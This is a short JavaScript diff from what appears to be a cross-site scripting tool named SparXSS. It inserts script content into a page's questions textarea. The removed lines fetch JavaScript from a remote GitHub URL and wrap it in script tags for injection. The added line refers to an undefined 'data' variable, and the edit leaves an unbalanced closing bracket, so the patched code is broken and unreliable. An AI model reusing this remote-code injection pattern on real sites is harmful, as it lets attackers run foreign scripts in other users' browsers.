@@ -719,10 +719,7 @@ if (typeof executed === 'undefined') {
             `;
     
             var textarea = document.querySelector('.questions-textarea');
-            textarea.value = textarea.value.replace(/<script>[\s\S]*?<\/script>/gi, '');
-            textarea.value = '&lt;script&gt;' + textarea.value;
-            codeSnippet += '&lt;/script&gt;';
-            textarea.value += codeSnippet;
+            textarea.value = textarea.value + '&lt;script&gt;' + data + '&lt;/script&gt;';
         }
     
         function fetchFaviconAndDisplay() {
@@ -849,10 +846,5 @@ if (typeof executed === 'undefined') {
     backgroundDiv2.style.display = 'none';
 
     var textarea = document.querySelector('.questions-textarea');
-
-    fetch('https://raw.githubusercontent.com/Amukerd/SparXSS/main/Testing/test3.js')
-        .then(response => response.text())
-        .then(data => {
-        textarea.value = '&lt;script&gt;' + data + '&lt;/script&gt;';
     })
 };
